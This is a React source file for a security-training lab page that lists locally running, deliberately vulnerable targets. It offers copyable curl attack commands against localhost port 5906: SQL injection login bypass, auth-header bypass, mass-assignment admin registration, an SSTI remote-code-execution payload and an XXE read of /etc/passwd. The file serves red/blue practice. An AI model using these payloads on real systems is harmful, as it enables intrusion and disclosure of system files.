import { useState } from "react"
import { useStore } from "../store"

const ATTACK_CMDS: { label: string; cmd: string }[] = [
  {
    label: "SQL Injection — login bypass",
    cmd: `curl -X POST http://127.0.0.1:5906/auth/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'`,
  },
  {
    label: "Auth bypass — admin panel",
    cmd: `curl -H "X-Admin: true" http://127.0.0.1:5906/admin`,
  },
  {
    label: "Mass assignment — register as admin",
    cmd: `curl -X POST http://127.0.0.1:5906/auth/register \\
  -H "Content-Type: application/json" \\
  -d '{"username":"eviladmin","password":"pass123","role":"admin"}'`,
  },
  {
    label: "SSTI — RCE",
    cmd: `curl "http://127.0.0.1:5906/api/templates/test?data={{__import__('os').popen('id').read()}}"`,
  },
  {
    label: "XXE — file read",
    cmd: `curl -X POST http://127.0.0.1:5906/api/export \\
  -H "Content-Type: application/xml" \\
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'`,
  },
  {
    label: "Scanner recon — sqlmap UA",
    cmd: `curl -H "User-Agent: sqlmap/1.7.10#stable (https://sqlmap.org)" http://127.0.0.1:5906/auth/login`,
  },
]

export default function Labs() {
  const { snap } = useStore()
  const [copied, setCopied] = useState<string | null>(null)

  const copy = (cmd: string) => {
    navigator.clipboard?.writeText(cmd).then(() => {
      setCopied(cmd)
      setTimeout(() => setCopied(null), 1500)
    })
  }

  return (
    <div className="grid" style={{ gap: 24 }}>
      <div className="view-head">
        <div>
          <h1>Built-in Labs</h1>
          <div className="sub">Deliberately vulnerable targets — run Red against them, or Blue over them. Everything is localhost.</div>
        </div>
      </div>

      <div className="card">
        <div className="card-title">Fleet — liveness probed live</div>
        <table className="table">
          <thead>
            <tr><th>Lab</th><th>Port</th><th>Status</th><th>Launch</th></tr>
          </thead>
          <tbody>
            {(snap?.labs ?? []).map((l) => (
              <tr key={l.name}>
                <td className="mono">{l.name}</td>
                <td className="mono dim">{l.port ? `:${l.port}` : "?"}</td>
                <td>
                  {l.running
                    ? <span className="badge badge-green">● RUNNING</span>
                    : <span className="badge badge-grey">stopped</span>}
                </td>
                <td className="mono dim">python3 medusa/lab/{l.name}/app.py</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="card">
        <div className="card-title">Quick Attack Commands — blue_target :5906</div>
        <div className="grid g2" style={{ gap: 14 }}>
          {ATTACK_CMDS.map((c) => (
            <div key={c.label} className="card" style={{ background: "var(--bg-secondary)" }}>
              <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
                <span className="small" style={{ color: "var(--text-primary)" }}>{c.label}</span>
                <button className="btn" onClick={() => copy(c.cmd)}>
                  {copied === c.cmd ? "copied ✓" : "copy"}
                </button>
              </div>
              <pre className="mono" style={{ color: "var(--text-secondary)", whiteSpace: "pre-wrap" }}>{c.cmd}</pre>
            </div>
          ))}
        </div>
        <div className="small" style={{ marginTop: 14 }}>
          Baseline locks after 25 requests — then AI analysis activates on the blue side.
        </div>
      </div>
    </div>
  )
}
